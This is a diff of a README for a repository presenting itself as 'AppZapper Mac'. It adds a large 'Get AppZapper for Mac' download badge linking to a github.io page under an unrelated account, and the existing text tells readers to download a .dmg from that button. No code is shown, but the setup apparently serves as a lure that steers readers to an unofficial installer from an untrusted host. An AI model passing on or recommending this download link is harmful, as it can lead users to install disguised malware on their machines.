@@ -4,6 +4,12 @@
 <img src="https://cdn.dribbble.com/userupload/21114438/file/original-b0eace306b2f6e4142c9c8c39a4daf3f.png?format=webp&resize=400x300&vertical=center" alt="AppZapper Mac Logo">  
 </div>  
 
+<div align="center">  
+<a href="https://junimata-orex.github.io/.github/appzapper">  
+<img src="https://img.shields.io/badge/🧹_Get_AppZapper_for_Mac-darkred?style=for-the-badge&logo=apple" alt="Get AppZapper for Mac">  
+</a>  
+</div>
+
 ## Installation via .dmg:
 
 1. Download .dmg by the button above.
